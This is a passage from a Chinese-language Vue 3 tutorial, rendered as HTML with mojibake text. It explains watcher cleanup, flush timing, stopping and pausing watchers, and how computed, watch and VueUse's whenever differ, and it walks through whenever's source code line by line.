<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(id, <span class="hljs-function">(<span class="hljs-params">newId, oldId, onCleanup</span>) =&gt;</span> {
  <span class="hljs-comment">// ...</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// æ¸…ç†é€»è¾‘</span>
  })
})

<span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">(<span class="hljs-params">onCleanup</span>) =&gt;</span> {
  <span class="hljs-comment">// ...</span>
  <span class="hljs-title function_">onCleanup</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// æ¸…ç†é€»è¾‘</span>
  })
</code></pre>
<p>é€šè¿‡å‡½æ•°å‚æ•°ä¼ é€’çš„ <code>onCleanup</code> ä¸ä¾¦å¬å™¨å®ä¾‹ç›¸ç»‘å®šï¼Œå› æ­¤ä¸å— <code>onWatcherCleanup</code> çš„åŒæ­¥é™åˆ¶ã€‚</p>

























<table><thead><tr><th/><th>æ—§æ–¹å¼ (<code>onInvalidate</code> å‚æ•°)</th><th>æ–°æ–¹å¼ (<code>onWatcherCleanup</code> API)</th></tr></thead><tbody><tr><td><strong>å¯ç”¨ç‰ˆæœ¬</strong></td><td>Vue 3.0+</td><td>Vue 3.5+</td></tr><tr><td><strong>ç”¨æ³•</strong></td><td><code>watch((v, ov, onInvalidate) =&gt; { onInvalidate(...) })</code></td><td><code>watch(() =&gt; { onWatcherCleanup(...) })</code></td></tr><tr><td><strong>çŠ¶æ€</strong></td><td><strong>ä»ç„¶æœ‰æ•ˆ</strong>ï¼Œä½†ä¸å†æ˜¯é¦–é€‰ã€‚</td><td><strong>æ¨èä½¿ç”¨</strong>ï¼Œæ˜¯æœªæ¥çš„æ–¹å‘ã€‚</td></tr></tbody></table>
<h4 data-id="heading-9">8. å›è°ƒçš„è§¦å‘æ—¶æœº</h4>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œä¾¦å¬å™¨å›è°ƒä¼šåœ¨<strong>çˆ¶ç»„ä»¶æ›´æ–° (å¦‚æœ‰) ä¹‹å</strong>ã€æ‰€å±ç»„ä»¶çš„ <strong>DOM æ›´æ–°ä¹‹å‰</strong>è¢«è°ƒç”¨ã€‚è¿™æ„å‘³ç€å¦‚æœä½ å°è¯•åœ¨ä¾¦å¬å™¨å›è°ƒä¸­è®¿é—®æ‰€å±ç»„ä»¶çš„ DOMï¼Œé‚£ä¹ˆ DOM å°†å¤„äºæ›´æ–°å‰çš„çŠ¶æ€ã€‚</p>
<h5 data-id="heading-10">Post Watchers</h5>
<p>å¦‚æœæƒ³åœ¨ä¾¦å¬å™¨å›è°ƒä¸­èƒ½è®¿é—®è¢« Vue æ›´æ–°<strong>ä¹‹å</strong>çš„æ‰€å±ç»„ä»¶çš„ DOMï¼Œä½ éœ€è¦æŒ‡æ˜ <code>flush: 'post'</code> é€‰é¡¹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(source, callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span>
})

<span class="hljs-title function_">watchEffect</span>(callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'post'</span>
})
</code></pre>
<p>åç½®åˆ·æ–°çš„ <code>watchEffect()</code> æœ‰ä¸ªæ›´æ–¹ä¾¿çš„åˆ«å <code>watchPostEffect()</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { watchPostEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-title function_">watchPostEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">/* åœ¨ Vue æ›´æ–°åæ‰§è¡Œ */</span>
})
</code></pre>
<h5 data-id="heading-11">åŒæ­¥ä¾¦å¬å™¨</h5>
<p>ä½ è¿˜å¯ä»¥åˆ›å»ºä¸€ä¸ªåŒæ­¥è§¦å‘çš„ä¾¦å¬å™¨ï¼Œå®ƒä¼šåœ¨ Vue è¿›è¡Œä»»ä½•æ›´æ–°ä¹‹å‰è§¦å‘ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">watch</span>(source, callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'sync'</span>
})

<span class="hljs-title function_">watchEffect</span>(callback, {
  <span class="hljs-attr">flush</span>: <span class="hljs-string">'sync'</span>
})
</code></pre>
<p>åŒæ­¥è§¦å‘çš„ <code>watchEffect()</code> æœ‰ä¸ªæ›´æ–¹ä¾¿çš„åˆ«å <code>watchSyncEffect()</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { watchSyncEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-title function_">watchSyncEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">/* åœ¨å“åº”å¼æ•°æ®å˜åŒ–æ—¶åŒæ­¥æ‰§è¡Œ */</span>
})
</code></pre>
<blockquote>
<p>â—è°¨æ…ä½¿ç”¨</p>
<p>åŒæ­¥ä¾¦å¬å™¨ä¸ä¼šè¿›è¡Œæ‰¹å¤„ç†ï¼Œæ¯å½“æ£€æµ‹åˆ°å“åº”å¼æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶å°±ä¼šè§¦å‘ã€‚å¯ä»¥ä½¿ç”¨å®ƒæ¥ç›‘è§†ç®€å•çš„å¸ƒå°”å€¼ï¼Œä½†åº”é¿å…åœ¨å¯èƒ½å¤šæ¬¡åŒæ­¥ä¿®æ”¹çš„æ•°æ®æº (å¦‚æ•°ç»„) ä¸Šä½¿ç”¨ã€‚</p>
</blockquote>
<h4 data-id="heading-12">9. åœæ­¢ä¾¦å¬å™¨</h4>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œç»„ä»¶å¸è½½æ—¶ä¼šè‡ªåŠ¨åœæ­¢ä¾¦å¬å™¨ï¼Œä½†æ˜¯ä¾¦å¬å™¨é»˜è®¤æ˜¯åœ¨åŒæ­¥åˆ›å»ºçš„ï¼Œå¦‚æœ<strong>å¼‚æ­¥</strong>åˆ›å»ºï¼Œå¿…é¡»æ‰‹åŠ¨åœæ­¢ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ï¼ï¼ï¼</p>
<p>å½“ä½ æŠŠ <code>watch</code> æˆ– <code>watchEffect</code> çš„è°ƒç”¨æ”¾åœ¨ä¸€ä¸ªå¼‚æ­¥å›è°ƒä¸­æ—¶ï¼ˆä¾‹å¦‚ <code>setTimeout</code>, <code>Promise.then</code>, <code>async/await</code> ä¹‹åï¼‰ï¼Œæƒ…å†µå°±å®Œå…¨ä¸åŒäº†ã€‚</p>
<ul>
<li>æ­¤æ—¶ï¼Œç»„ä»¶çš„ <code>setup()</code> å‡½æ•°å·²ç»æ‰§è¡Œå®Œæ¯•ã€‚</li>
<li>å½“ä½ çš„å¼‚æ­¥å›è°ƒå‡½æ•°æœ€ç»ˆæ‰§è¡Œæ—¶ï¼ŒVue çš„æ‰§è¡Œä¸Šä¸‹æ–‡å·²ç»æ”¹å˜ï¼Œ<code>getCurrentInstance()</code> ä¼šè¿”å› <code>null</code>ã€‚</li>
</ul>
<p>ä¾¦å¬å™¨åœ¨åˆ›å»ºæ—¶ï¼Œç¯é¡¾å››å‘¨å‘ç°ï¼šâ€œæˆ‘ä¸çŸ¥é“æˆ‘å±äºå“ªä¸ªç»„ä»¶ï¼â€ å®ƒæ— æ³•æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥â€œæŠ¥åˆ°â€çš„ç»„ä»¶å®ä¾‹ã€‚</p>
<p>è¿™ä¸ªä¾¦å¬å™¨å°±æˆäº†ä¸€ä¸ª**â€œå­¤å„¿â€**ï¼Œå®ƒç‹¬ç«‹äºä»»ä½•ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸä¹‹å¤–ã€‚å› æ­¤ï¼Œå½“åŸæ¥çš„ç»„ä»¶è¢«å¸è½½æ—¶ï¼ŒVue çš„æ¸…ç†æœºåˆ¶æ ¹æœ¬ä¸çŸ¥é“è¿™ä¸ªâ€œå­¤å„¿â€ä¾¦å¬å™¨çš„å­˜åœ¨ï¼Œè‡ªç„¶ä¹Ÿæ— æ³•ä¸ºå®ƒè°ƒç”¨ <code>stop()</code>ã€‚</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { watchEffect } from 'vue'
// å®ƒä¼šè‡ªåŠ¨åœæ­¢
watchEffect(() =&gt; {})

// ...è¿™ä¸ªåˆ™ä¸ä¼šï¼
setTimeout(() =&gt; {
  watchEffect(() =&gt; {})
}, 100)
&lt;/script&gt;
</code></pre>
<p>è¦æ‰‹åŠ¨åœæ­¢ä¸€ä¸ªä¾¦å¬å™¨ï¼Œè¯·è°ƒç”¨ <code>watch</code> æˆ– <code>watchEffect</code> è¿”å›çš„å‡½æ•°ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> unwatch = <span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {})

<span class="hljs-comment">// ...å½“è¯¥ä¾¦å¬å™¨ä¸å†éœ€è¦æ—¶</span>
<span class="hljs-title function_">unwatch</span>()
</code></pre>
<h5 data-id="heading-13">æš‚åœ/æ¢å¤ä¾¦å¬å™¨(3.5+)</h5>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { stop, pause, resume } = <span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> {})
<span class="hljs-comment">// æš‚åœä¾¦å¬å™¨</span>
<span class="hljs-title function_">pause</span>()
<span class="hljs-comment">// ç¨åæ¢å¤</span>
<span class="hljs-title function_">resume</span>()
<span class="hljs-comment">// åœæ­¢</span>
<span class="hljs-title function_">stop</span>()

<span class="hljs-keyword">const</span> { stop, pause, resume } = <span class="hljs-title function_">watchEffect</span>(<span class="hljs-function">() =&gt;</span> {})
<span class="hljs-comment">// æš‚åœä¾¦å¬å™¨</span>
<span class="hljs-title function_">pause</span>()
<span class="hljs-comment">// ç¨åæ¢å¤</span>
<span class="hljs-title function_">resume</span>()
<span class="hljs-comment">// åœæ­¢</span>
<span class="hljs-title function_">stop</span>()
</code></pre>
<h2 data-id="heading-14"><code>computed</code> vs <code>watch</code> vs <code>whenever</code></h2>
<p>åœ¨ <code>Vue</code> ä¸­ï¼Œ<code>computed</code> å’Œ <code>watch</code> éƒ½æ˜¯å¤„ç†å“åº”å¼æ•°æ®å˜åŒ–çš„æ ¸å¿ƒå·¥å…·ï¼Œä½†å®ƒä»¬çš„åº”ç”¨åœºæ™¯å’Œè®¾è®¡ç†å¿µå®Œå…¨ä¸åŒã€‚<strong><code>VueUse</code></strong> åº“åˆ™åœ¨ <code>watch</code> çš„åŸºç¡€ä¸Šæä¾›äº†æ›´å…·è¡¨è¾¾åŠ›çš„å·¥å…·ï¼Œå¦‚ <code>whenever</code>ã€‚</p>
<h4 data-id="heading-15">1. <code>computed</code> vs <code>watch</code>ï¼šæ ¸å¿ƒåŒºåˆ«</h4>
<p>ç®€å•æ¥è¯´ï¼š</p>
<ul>
<li><strong><code>computed</code></strong>ï¼šç”¨äº<strong>æ´¾ç”Ÿ</strong>å‡ºä¸€ä¸ªæ–°çš„ã€å¯ç¼“å­˜çš„å“åº”å¼æ•°æ®ã€‚å®ƒå…³å¿ƒçš„æ˜¯<strong>è¿”å›å€¼</strong>ã€‚</li>
<li><strong><code>watch</code></strong>ï¼šç”¨äº<strong>è§‚å¯Ÿ</strong>ä¸€ä¸ªæ•°æ®çš„å˜åŒ–ï¼Œå¹¶æ‰§è¡Œ<strong>å‰¯ä½œç”¨</strong>ï¼ˆSide Effectï¼‰ã€‚å®ƒä¸å…³å¿ƒè¿”å›å€¼ã€‚</li>
</ul>
<h5 data-id="heading-16">å¯¹æ¯”è¡¨æ ¼</h5>








































<table><thead><tr><th>ç‰¹æ€§</th><th><code>computed</code> (è®¡ç®—å±æ€§)</th><th><code>watch</code> (ä¾¦å¬å™¨)</th></tr></thead><tbody><tr><td><strong>æœ¬è´¨</strong></td><td><strong>æ´¾ç”Ÿå€¼ (Derivation)</strong></td><td><strong>å‰¯ä½œç”¨ (Side Effect)</strong></td></tr><tr><td><strong>è¿”å›å€¼</strong></td><td><strong>å¿…é¡»æœ‰</strong>ï¼Œè¿”å›ä¸€ä¸ªå¯ç¼“å­˜çš„ <code>ref</code></td><td><strong>æ²¡æœ‰</strong>ï¼Œæ‰§è¡Œä¸€ä¸ªå›è°ƒå‡½æ•°</td></tr><tr><td><strong>ç¼“å­˜</strong></td><td><strong>æœ‰</strong>ã€‚ä¾èµ–ä¸å˜æ—¶ï¼Œå¤šæ¬¡è®¿é—®ç›´æ¥è¿”å›ç¼“å­˜ç»“æœ</td><td><strong>æ²¡æœ‰</strong>ã€‚æ¯æ¬¡æ•°æ®å˜åŒ–éƒ½ä¼šæ‰§è¡Œå›è°ƒ</td></tr><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>æ‡’æ‰§è¡Œã€‚ä»…åœ¨è¢«è®¿é—®ä¸”ä¾èµ–å˜åŒ–æ—¶æ‰é‡æ–°è®¡ç®—</td><td>é»˜è®¤æ‡’æ‰§è¡Œã€‚ä»…åœ¨æ•°æ®å˜åŒ–åæ‰§è¡Œå›è°ƒï¼ˆå¯é€šè¿‡ <code>immediate</code> é…ç½®ç«‹å³æ‰§è¡Œï¼‰</td></tr><tr><td><strong>å¼‚æ­¥æ“ä½œ</strong></td><td><strong>ä¸æ”¯æŒ</strong>ã€‚è®¡ç®—å±æ€§å†…éƒ¨åº”è¯¥æ˜¯åŒæ­¥çš„çº¯å‡½æ•°</td><td><strong>æ”¯æŒ</strong>ã€‚å¯ä»¥åœ¨å›è°ƒä¸­æ‰§è¡Œ <code>API</code> è¯·æ±‚ç­‰å¼‚æ­¥æ“ä½œ</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>ä»ç°æœ‰æ•°æ®è®¡ç®—æ–°æ•°æ®ï¼ˆå¦‚ <code>fullName</code>ï¼‰</td><td>æ•°æ®å˜åŒ–æ—¶æ‰§è¡Œå¼‚æ­¥æ“ä½œã€æ›´æ–°é <code>Vue</code> ç®¡ç†çš„ DOMã€æˆ–æ‰§è¡Œå¤æ‚é€»è¾‘</td></tr></tbody></table>
<h5 data-id="heading-17">ä»£ç ç¤ºä¾‹</h5>
<p><strong><code>computed</code> ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">const</span> firstName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'John'</span>);
<span class="hljs-keyword">const</span> lastName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'Doe'</span>);

<span class="hljs-comment">// `fullName` æ˜¯ä¸€ä¸ªæ´¾ç”Ÿå‡ºæ¥çš„ refï¼Œå®ƒä¾èµ–äº firstName å’Œ lastName</span>
<span class="hljs-keyword">const</span> fullName = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è®¡ç®— fullName...'</span>); <span class="hljs-comment">// åªæœ‰ä¾èµ–å˜åŒ–æ—¶æ‰æ‰“å°</span>
 <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${firstName.value}</span> <span class="hljs-subst">${lastName.value}</span>`</span>;
});
<span class="hljs-comment">// åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ {{ fullName }} å³å¯</span>
</code></pre>
<p><strong><code>watch</code> ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { ref, watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">const</span> userId = <span class="hljs-title function_">ref</span>(<span class="hljs-number">1</span>);
<span class="hljs-keyword">const</span> userData = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>);

<span class="hljs-comment">// ä¾¦å¬ userId çš„å˜åŒ–ï¼Œç„¶åæ‰§è¡Œè·å–æ•°æ®çš„å‰¯ä½œç”¨</span>
<span class="hljs-title function_">watch</span>(userId, <span class="hljs-keyword">async</span> (newId, oldId) =&gt; {
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`User ID ä» <span class="hljs-subst">${oldId}</span> å˜ä¸º <span class="hljs-subst">${newId}</span>ï¼Œæ­£åœ¨è·å–æ–°æ•°æ®...`</span>);
    
 <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/users/<span class="hljs-subst">${newId}</span>`</span>);
 userData.<span class="hljs-property">value</span> = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
}, { <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span> }); <span class="hljs-comment">// immediate: true ç¡®ä¿ç»„ä»¶åŠ è½½æ—¶å°±è·å–ä¸€æ¬¡æ•°æ®</span>
</code></pre>
<hr/>
<h4 data-id="heading-18">2. <code>watch</code> vs <code>whenever</code> (æ¥è‡ª <code>VueUse</code>)</h4>
<p><code>VueUse</code> æ˜¯ä¸€ä¸ªåŸºäº Composition API çš„å®ç”¨å·¥å…·é›†ã€‚ <a href="https://link.juejin.cn?target=https%3A%2F%2Fvueuse.org%2Fshared%2Fwhenever%2F" target="_blank" title="https://vueuse.org/shared/whenever/" ref="nofollow noopener noreferrer"><code>whenever</code></a> æ˜¯å®ƒæä¾›çš„ä¸€ä¸ª <code>watch</code> çš„â€œè¯­æ³•ç³–â€ï¼Œè®©ä»£ç æ›´å…·å¯è¯»æ€§ã€‚</p>
<h5 data-id="heading-19">æ ¸å¿ƒåŒºåˆ«</h5>
<ul>
<li><strong><code>watch</code></strong>ï¼šæ— è®ºæ–°å€¼æ˜¯ä»€ä¹ˆï¼Œåªè¦æ•°æ®æºå˜åŒ–ï¼Œå›è°ƒ<strong>æ€»æ˜¯</strong>æ‰§è¡Œã€‚</li>
<li><strong><code>whenever</code></strong>ï¼šåªæœ‰å½“æ•°æ®æºçš„å€¼<strong>å˜ä¸ºçœŸå€¼ (truthy)</strong> æ—¶ï¼Œå›è°ƒæ‰ä¼šæ‰§è¡Œã€‚å®ƒæ˜¯ä¸€ä¸ªå¸¦æœ‰å†…ç½®æ¡ä»¶åˆ¤æ–­çš„ <code>watch</code>ã€‚</li>
</ul>
<p><code>whenever</code> çš„å†…éƒ¨å…¶å®å°±æ˜¯ä½¿ç”¨ <code>watchWithFilter</code> å®ç°çš„ï¼Œå®ƒç­‰ä»·äºä¸€ä¸ªå¸¦æœ‰ <code>filter</code> é€‰é¡¹çš„ <code>watch</code>ã€‚</p>
<h5 data-id="heading-20">å¯¹æ¯”è¡¨æ ¼</h5>

























<table><thead><tr><th>ç‰¹æ€§</th><th><code>watch</code></th><th><code>whenever</code> (<code>VueUse</code>)</th></tr></thead><tbody><tr><td><strong>æ‰§è¡Œæ¡ä»¶</strong></td><td>æ•°æ®æºå˜åŒ–å°±æ‰§è¡Œ</td><td>æ•°æ®æºå˜åŒ–ï¼Œ<strong>ä¸”æ–°å€¼ä¸ºçœŸå€¼ (truthy)</strong> æ—¶æ‰æ‰§è¡Œ</td></tr><tr><td><strong>å¯è¯»æ€§</strong></td><td>éœ€è¦åœ¨å›è°ƒå‡½æ•°å†…éƒ¨å†™ <code>if</code> åˆ¤æ–­</td><td>éå¸¸é«˜ï¼Œè¯­ä¹‰æ¸…æ™°ï¼Œä»£ç å³æ³¨é‡Š</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>é€šç”¨çš„ä¾¦å¬åœºæ™¯</td><td>å½“æŸä¸ªæ¡ä»¶æ»¡è¶³æ—¶æ‰§è¡Œä¸€æ¬¡æ€§æ“ä½œï¼ˆå¦‚å¼¹çª—ã€ç™»å½•æˆåŠŸåè·³è½¬ï¼‰</td></tr></tbody></table>
<p><strong>ä½¿ç”¨ <code>watch</code> çš„å†™æ³•ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { watch, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> myValue = ref&lt;string | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)

<span class="hljs-title function_">watch</span>(myValue, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
  <span class="hljs-comment">// æ¯æ¬¡ myValue å˜åŒ–éƒ½ä¼šæ‰§è¡Œè¿™é‡Œ</span>
  <span class="hljs-keyword">if</span> (newValue) { <span class="hljs-comment">// éœ€è¦è‡ªå·±åŠ ä¸€ä¸ª if åˆ¤æ–­</span>
    <span class="hljs-comment">// åªæœ‰å½“ newValue æ˜¯çœŸå€¼æ—¶æ‰æ‰§è¡Œæ ¸å¿ƒé€»è¾‘</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å€¼å˜æˆäº†: <span class="hljs-subst">${newValue}</span>`</span>)
  }
})
</code></pre>
<p><strong>ä½¿ç”¨ <code>whenever</code> çš„å†™æ³• (æ›´ä¼˜é›…)ï¼š</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { whenever } <span class="hljs-keyword">from</span> <span class="hljs-string">'@vueuse/core'</span>

<span class="hljs-keyword">const</span> myValue = ref&lt;string | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)

<span class="hljs-title function_">whenever</span>(myValue, <span class="hljs-function">(<span class="hljs-params">newValue</span>) =&gt;</span> {
  <span class="hljs-comment">// åªæœ‰å½“ myValue å˜ä¸ºçœŸå€¼æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œè¿™é‡Œ</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å€¼å˜æˆäº†: <span class="hljs-subst">${newValue}</span>`</span>)
})
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬æ¥é€è¡Œåˆ†æå®ƒçš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvueuse%2Fvueuse%2Fblob%2Fmain%2Fpackages%2Fshared%2Fwhenever%2Findex.ts" target="_blank" title="https://github.com/vueuse/vueuse/blob/main/packages/shared/whenever/index.ts" ref="nofollow noopener noreferrer"><code>å®ç°</code></a></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * Shorthand for watching value to be truthy
 *
 * <span class="hljs-doctag">@see</span> https://vueuse.org/whenever
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> whenever&lt;T&gt;(<span class="hljs-attr">source</span>: <span class="hljs-title class_">WatchSource</span>&lt;T | <span class="hljs-literal">false</span> | <span class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span>&gt;, <span class="hljs-attr">cb</span>: <span class="hljs-title class_">WatchCallback</span>&lt;T&gt;, options?: <span class="hljs-title class_">WheneverOptions</span>) {
  <span class="hljs-keyword">const</span> stop = <span class="hljs-title function_">watch</span>(
    source,
    <span class="hljs-function">(<span class="hljs-params">v, ov, onInvalidate</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (v) {
        <span class="hljs-keyword">if</span> (options?.<span class="hljs-property">once</span>)
          <span class="hljs-title function_">nextTick</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">stop</span>())
        <span class="hljs-title function_">cb</span>(v, ov, onInvalidate)
      }
    },
    {
      ...options,
      <span class="hljs-attr">once</span>: <span class="hljs-literal">false</span>,
    } <span class="hljs-keyword">as</span> <span class="hljs-title class_">WatchOptions</span>,
  )
  <span class="hljs-keyword">return</span> stop
}
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. å®šä¹‰äº†å‡½æ•°çš„ç­¾å</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> whenever&lt;T&gt;(<span class="hljs-attr">source</span>: <span class="hljs-title class_">WatchSource</span>&lt;T | <span class="hljs-literal">false</span> | <span class="hljs-literal">null</span> | <span class="hljs-literal">undefined</span>&gt;, <span class="hljs-attr">cb</span>: <span class="hljs-title class_">WatchCallback</span>&lt;T&gt;, options?: <span class="hljs-title class_">WheneverOptions</span>) {
</code></pre>
<ul>
<li><strong><code>source</code></strong>: è¿™æ˜¯è¦ä¾¦å¬çš„æºã€‚å¯ä»¥æ˜¯ <code>ref</code>ã€<code>reactive</code> å¯¹è±¡ã€<code>getter</code> å‡½æ•°ç­‰ã€‚æ³¨æ„å®ƒçš„ç±»å‹ <code>T | false | null | undefined</code>ï¼Œè¿™æ˜ç¡®è¡¨ç¤º <code>whenever</code> å°±æ˜¯ä¸ºäº†å¤„ç†å¯èƒ½ä¸ºâ€œå‡å€¼ (<code>falsy</code>)â€çš„æºè€Œè®¾è®¡çš„ã€‚</li>
<li><strong><code>cb</code></strong>: è¿™æ˜¯å½“ <code>source</code> å˜ä¸ºçœŸå€¼æ—¶è¦æ‰§è¡Œçš„å›è°ƒå‡½æ•°ã€‚</li>
<li><strong><code>options</code></strong>: è¿™æ˜¯ä¸€ä¸ªå¯é€‰çš„é…ç½®å¯¹è±¡ï¼Œå®ƒç»§æ‰¿äº† <code>watch</code> çš„æ‰€æœ‰é€‰é¡¹ï¼ˆå¦‚ <code>immediate</code>, <code>deep</code>ï¼‰ï¼Œå¹¶é¢å¤–å¢åŠ äº†ä¸€ä¸ª <code>once</code> é€‰é¡¹ã€‚</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 2. å‡½æ•°çš„æ ¸å¿ƒï¼šè°ƒç”¨ Vue å†…ç½®çš„ watch å‡½æ•°</span>
  <span class="hljs-keyword">const</span> stop = <span class="hljs-title function_">watch</span>(
</code></pre>
<p><code>whenever</code> çš„æœ¬è´¨å°±æ˜¯ä¸€ä¸ª <code>watch</code>ã€‚å®ƒè¿”å› <code>watch</code> çš„ <code>stop</code> å‡½æ•°ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥åƒåœæ­¢ä¸€ä¸ªæ™®é€š <code>watch</code> ä¸€æ ·åœæ­¢ <code>whenever</code>ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 3. watch çš„å›è°ƒå‡½æ•°ï¼Œè¿™æ˜¯ whenever çš„é­”æ³•æ‰€åœ¨</span>
    source,
    <span class="hljs-function">(<span class="hljs-params">v, ov, onInvalidate</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (v) { <span class="hljs-comment">// &lt;--- å…³é”®æ£€æŸ¥ï¼</span>
        <span class="hljs-keyword">if</span> (options?.<span class="hljs-property">once</span>)
          <span class="hljs-title function_">nextTick</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">stop</span>())
        <span class="hljs-title function_">cb</span>(v, ov, onInvalidate)
      }
    },
</code></pre>
<p>è¿™æ˜¯ä¼ é€’ç»™å†…éƒ¨ <code>watch</code> çš„å›è°ƒå‡½æ•°ã€‚æ¯æ¬¡ <code>source</code> å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸ªå‡½æ•°éƒ½ä¼šè¢«è°ƒç”¨ã€‚</p>
<ul>
<li>
<p><strong><code>if (v)</code></strong>: è¿™æ˜¯æ•´ä¸ªå‡½æ•°çš„æ ¸å¿ƒã€‚<code>v</code> æ˜¯ <code>source</code> çš„æ–°å€¼ã€‚è¿™ä¸ª <code>if</code> è¯­å¥æ£€æŸ¥æ–°å€¼æ˜¯å¦ä¸º<strong>çœŸå€¼</strong>ï¼ˆå³ä¸æ˜¯ <code>null</code>, <code>undefined</code>, <code>false</code>, <code>0</code>, <code>''</code> æˆ– <code>NaN</code>ï¼‰ã€‚</p>
</li>
<li>
<p>åªæœ‰å½“ <code>v</code> æ˜¯çœŸå€¼æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œ <code>if</code> å—å†…éƒ¨çš„é€»è¾‘ã€‚</p>
</li>
<li>
<p><code>if (options?.once)</code></p>
<p>: å¦‚æœç”¨æˆ·è®¾ç½®äº†<code>once: true</code>ï¼Œåˆ™æ‰§è¡Œ <code>nextTick(() =&gt; stop())</code>ã€‚</p>
<ul>
<li>
<p><strong><code>stop()</code></strong>: è°ƒç”¨è¿™ä¸ªå‡½æ•°ä¼šåœæ­¢å½“å‰çš„ <code>watch</code>ï¼Œä»è€Œå®ç°â€œåªæ‰§è¡Œä¸€æ¬¡â€çš„æ•ˆæœã€‚</p>
</li>
<li>
<p><strong><code>nextTick()</code></strong>: ä¸ºä»€ä¹ˆè¦ç”¨ <code>nextTick</code>ï¼Ÿ</p>
<blockquote>
<p>âœ¨è¿™æ˜¯ä¸€ä¸ªéå¸¸å·§å¦™çš„ç»†èŠ‚ã€‚å®ƒç¡®ä¿äº†æœ¬æ¬¡çš„å›è°ƒå‡½æ•° <code>cb</code> èƒ½å¤Ÿå®Œæ•´æ‰§è¡Œå®Œæ¯•ï¼Œç„¶ååœ¨ä¸‹ä¸€ä¸ª DOM æ›´æ–°å‘¨æœŸï¼ˆtickï¼‰ä¸­å†åœæ­¢ä¾¦å¬ã€‚è¿™é¿å…äº†åœ¨å›è°ƒå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­å°±é”€æ¯ä¾¦å¬å™¨å¯èƒ½å¼•å‘çš„æ½œåœ¨é—®é¢˜ã€‚</p>
</blockquote>
</li>
</ul>
</li>
<li>
